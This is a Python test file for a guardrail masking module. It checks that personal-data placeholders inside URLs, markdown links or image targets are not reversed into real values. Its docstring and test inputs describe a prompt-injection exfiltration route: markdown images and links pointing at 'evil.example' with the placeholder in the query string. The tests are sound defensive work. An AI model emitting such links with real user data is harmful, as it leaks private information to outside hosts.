"""08-tam-1a r1 MAJOR-3 (KARARLAR "C17 geri çevirme bağlam istisnası", A): a placeholder inside a
URL or a markdown link/image target is not reversed, or an upstream (external agent, provider,
an injected instruction) could write `![x](https://its-host/?q=<<PII_1>>)` and a client that
loads images would send the value there. It stays a placeholder and is counted
(`detokenize_skipped_url`, no value). Text around it is reversed as before."""

import asyncio
import logging

import pytest

from ffcore.guardrails.masking import (
    StreamDetokenizer,
    detokenize_json,
    reveal_text,
)
from tests.unit.test_08t_c17_masking import _store_with

run = asyncio.run
NAME = "Ayşe Kaya"


@pytest.mark.parametrize(
    "text",
    [
        "![x](https://evil.example/?q=<<PII_1>>)",
        "[profil](<<PII_1>>)",
        "[link](https://evil.example/u/<<PII_1>>/x)",
        '<a href="https://evil.example/?q=<<PII_1>>">tıkla</a>',
        "<a href=<<PII_1>>>tıkla</a>",
        "https://evil.example/?q=<<PII_1>>",
        "HTTP://EVIL.EXAMPLE/<<PII_1>>",
    ],
)
def test_08t_m3_placeholder_in_a_url_stays(text):
    store, _ = _store_with([NAME])
    out, unresolved, skipped = run(reveal_text(text, store=store, scope="run-1"))
    assert out == text and NAME not in out
    assert (unresolved, skipped) == (0, 1)


def test_08t_m3_text_around_a_url_is_reversed():
    store, _ = _store_with([NAME])
    text = "Sahibi <<PII_1>>; ayrıntı: https://site.example/kayit ve ![g](https://h/?a=<<PII_1>>)"
    out, _, skipped = run(reveal_text(text, store=store, scope="run-1"))
    assert (
        out == f"Sahibi {NAME}; ayrıntı: https://site.example/kayit ve ![g](https://h/?a=<<PII_1>>)"
    )
    assert skipped == 1


@pytest.mark.parametrize(
    ("pieces", "expected"),
    [
        (
            ["Bak: ![x](https://evil.example/?q=", "<<PII_1>>) ve <<PII_1>>."],
            f"Bak: ![x](https://evil.example/?q=<<PII_1>>) ve {NAME}.",
        ),
        (
            ["Bak: ![x](https://evil.exa", "mple/?q=<<PI", "I_1>>) ve <<PII_1>>."],
            f"Bak: ![x](https://evil.example/?q=<<PII_1>>) ve {NAME}.",
        ),
        (["https://", "h/", "<<PII_1>>"], "https://h/<<PII_1>>"),
    ],
)
def test_08t_m3_stream_url_split_over_chunks_stays(pieces, expected):
    # The URL starts in one chunk, the placeholder comes in a later one: the context carries.
    store, _ = _store_with([NAME])

    async def go():
        sd = StreamDetokenizer(store, "run-1")
        out = [await sd.feed(p) for p in pieces]
        out.append(await sd.flush())
        return "".join(out), sd.skipped_url

    assert run(go()) == (expected, 1)


def test_08t_m3_json_strings_skip_urls_and_count(caplog):
    store, _ = _store_with([NAME])
    data = {"text": "![x](https://h/?q=<<PII_1>>)", "other": "<<PII_1>>"}
    out, unresolved, skipped = run(detokenize_json(data, store=store, scope="run-1"))
    assert out == {"text": "![x](https://h/?q=<<PII_1>>)", "other": NAME}
    assert (unresolved, skipped) == (0, 1)


def test_08t_m3_skip_log_has_no_value(caplog):
    from ffcore.guardrails.masking import log_skipped_url

    with caplog.at_level(logging.INFO, logger="ffcore.guardrails.masking"):
        log_skipped_url("run-1", 2)
    assert "detokenize_skipped_url scope=run-1 count=2" in caplog.text
